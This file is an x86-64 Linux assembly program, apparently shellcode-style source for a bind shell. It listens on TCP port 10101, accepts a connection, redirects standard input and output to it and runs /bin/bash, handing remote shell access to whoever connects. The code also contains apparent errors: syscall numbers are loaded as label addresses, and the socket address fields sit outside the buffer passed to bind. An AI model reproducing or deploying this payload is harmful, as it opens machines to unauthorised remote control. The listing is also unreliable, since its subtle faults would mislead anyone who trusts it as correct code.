.data
    sockfd:     .quad 0
    fd:         .quad 0
    my_sin:     .space 16         /* allocate 16 bytes for sockaddr_in structure */
    sin_family: .word 0
    sin_port:   .word 0x7527      /* htons(10101) */
    sin_addr:   .quad 0
    sin_zero:   .quad 0

.text
.global main
main:
    /* Create socket */
    movq $SYS_SOCKET, %rax
    movq $AF_INET, %rdi
    movq $SOCK_STREAM, %rsi
    movq $IPPROTO_TCP, %rdx
    syscall
    movq %rax, sockfd

    /* Fill in sockaddr_in structure */
    movw $AF_INET, sin_family
    movw $10101, %ax           /* PORT = 10101 */
    xchgb %ah, %al             /* htons(), AH ⇔ AL */
    movw %ax, sin_port
    movq %rdx, sin_addr

    /* Bind socket */
    movq $SYS_BIND, %rax
    movq sockfd, %rdi
    leaq my_sin, %rsi          /* address of my_sin structure */
    movq $0x10, %rdx           /* sizeof(sockaddr_in) = 16 */
    syscall

    /* Listen on socket */
    movq $SYS_LISTEN, %rax
    movq sockfd, %rdi
    movq $1, %rsi
    syscall

    /* Accept connection */
    movq $SYS_ACCEPT, %rax
    movq sockfd, %rdi
    movq $0, %rsi
    movq $0, %rdx
    syscall
    movq %rax, fd

    /* Redirect stdin, stdout, stderr to the socket */
    movq $SYS_DUP2, %rax
    movq fd, %rdi
    movq $0, %rsi
    syscall
    movq $SYS_DUP2, %rax
    movq fd, %rdi
    movq $1, %rsi
    syscall
    movq $SYS_DUP2, %rax
    movq fd, %rdi
    movq $2, %rsi
    syscall

    /* Execute /bin/bash */
    movq $SYS_EXECVE, %rax
    movq $bash, %rdi
    xor %rsi, %rsi
    xor %rdx, %rdx
    syscall

    /* Exit */
    movq $SYS_EXIT, %rax
    xor %rdi, %rdi
    syscall

.data
    SYS_SOCKET:  .quad 41
    SYS_BIND:    .quad 49
    SYS_LISTEN:  .quad 50
    SYS_ACCEPT:  .quad 43
    SYS_DUP2:    .quad 33
    SYS_EXECVE:  .quad 59
    SYS_EXIT:    .quad 60
    AF_INET:     .quad 2
    SOCK_STREAM: .quad 1
    IPPROTO_TCP: .quad 6
    bash:        .asciz "/bin/bash"

